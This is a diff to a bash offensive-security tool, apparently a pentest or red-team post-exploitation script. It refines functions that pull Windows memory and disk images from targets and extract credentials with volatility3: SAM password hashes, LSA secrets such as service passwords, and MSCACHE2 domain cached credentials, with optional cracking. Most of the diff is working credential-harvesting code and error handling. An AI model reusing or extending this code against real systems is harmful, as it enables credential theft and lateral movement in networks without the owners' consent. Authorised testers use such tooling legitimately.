@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.48.2"
+readonly VERSION="1.48.3"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -4811,26 +4811,34 @@ _harvest_memimage() {
     local img="$1" vb base; base=$(basename "$img")
     vb=$(_vol_bin) || { warn "  volatility3 not installed (pip install volatility3) — skipping $base"; return 1; }
     subsection "volatility3 hashdump → $base"
-    local hd="$OUTDIR/vol_${base}.hashdump"
+    local hd="$OUTDIR/vol_${base}.hashdump" verr found=1
     run "$vb -q -f '$img' windows.hashdump"
-    "$vb" -q -f "$img" windows.hashdump >"$hd" 2>>"$LOGFILE" || warn "  windows.hashdump failed (wrong profile / not a Windows memory image?)"
-    _vol_ingest_hashes "$hd" "$base" || info "  No SAM hashes recovered from $base"
+    # Capture stderr so we can report the REAL reason, not a generic guess. The most
+    # common one: vol3 silently DROPS windows.hashdump/lsadump/cachedump when their
+    # crypto dep (pycryptodome) is missing → "invalid choice: windows.hashdump".
+    verr=$("$vb" -q -f "$img" windows.hashdump 2>&1 >"$hd"); printf '%s\n' "$verr" >>"$LOGFILE"
+    if grep -qiE "invalid choice:?.*hashdump|argument PLUGIN" <<<"$verr"; then
+        warn "  vol3 is missing the hashdump plugin (crypto dep). Fix: ${C_BOLD}pipx inject volatility3 pycryptodome${C_RESET}  (or: pip install pycryptodome), then re-run"
+    elif [[ -n "$verr" ]] && ! [[ -s "$hd" ]]; then
+        warn "  windows.hashdump failed → $(grep -iE 'error|exception|unable|no suitable' <<<"$verr" | head -1)"
+    fi
+    _vol_ingest_hashes "$hd" "$base" && found=0 || info "  No SAM hashes recovered from $base"
 
     # LSA secrets (machine acct, DefaultPassword, service creds) — best effort.
     local ls="$OUTDIR/vol_${base}.lsadump"
     "$vb" -q -f "$img" windows.lsadump >"$ls" 2>>"$LOGFILE" || true
     [[ -s "$ls" ]] && grep -qiE 'DefaultPassword|DPAPI|_SC_|aspnet' "$ls" 2>/dev/null \
-        && loot "  LSA secrets recovered → $(basename "$ls") (review for plaintext service creds)"
+        && { loot "  LSA secrets recovered → $(basename "$ls") (review for plaintext service creds)"; found=0; }
 
     # Domain cached creds (MSCACHE2 / $DCC2$) — not pass-the-hash usable, but crackable.
     local cc="$OUTDIR/vol_${base}.cachedump"
     "$vb" -q -f "$img" windows.cachedump >"$cc" 2>>"$LOGFILE" || true
     if grep -qiE '\$DCC2\$|\$MSCACHE' "$cc" 2>/dev/null; then
         grep -oiE '.*\$DCC2\$[0-9#a-f]+' "$cc" >>"$OUTDIR/mscache_hashes.txt" 2>/dev/null
-        loot "  Domain cached creds (MSCACHE2) → mscache_hashes.txt"
+        loot "  Domain cached creds (MSCACHE2) → mscache_hashes.txt"; found=0
         [[ "$DO_CRACK" == "1" ]] && crack_hashes "$OUTDIR/mscache_hashes.txt" 2100 "MSCACHE2"
     fi
-    return 0
+    return $found
 }
 
 # Mount a disk image read-only, locate SAM/SYSTEM hives (+ NTDS.dit) → secretsdump. $1=file
@@ -4937,12 +4945,21 @@ PYEOF
             warn "  Download failed → $path"; continue
         fi
         loot "  Pulled $(du -h "$local_f" 2>/dev/null | cut -f1) → ${local_f#$OUTDIR/}"
+        local harv_ok=0
         case "$kind" in
-            mem)  _harvest_memimage  "$local_f" ;;
-            disk) _harvest_diskimage "$local_f" ;;
+            mem)  _harvest_memimage  "$local_f" && harv_ok=1 ;;
+            disk) _harvest_diskimage "$local_f" && harv_ok=1 ;;
         esac
-        # Reclaim space: these are multi-GB. Keep only if user asked to.
-        [[ "${KEEP_DUMPS:-0}" == "1" ]] || { rm -f "$local_f" 2>/dev/null; detail "      (removed local copy; set KEEP_DUMPS=1 to retain)"; }
+        # Reclaim space (these are multi-GB) ONLY when the harvest succeeded or the user
+        # opted out. On FAILURE keep the image — re-downloading GBs to retry a fixable
+        # error (e.g. a missing vol3 dep) is wasteful — and print the manual retry.
+        if [[ "${KEEP_DUMPS:-0}" == "1" ]]; then
+            detail "      (kept local copy — KEEP_DUMPS=1)"
+        elif [[ "$harv_ok" == "1" ]]; then
+            rm -f "$local_f" 2>/dev/null; detail "      (removed local copy; set KEEP_DUMPS=1 to retain)"
+        else
+            warn "  Kept ${local_f#$OUTDIR/} (nothing harvested) — retry: $(_vol_bin 2>/dev/null || echo vol) -f '$local_f' windows.hashdump"
+        fi
     done <<<"$matches"
 }
 
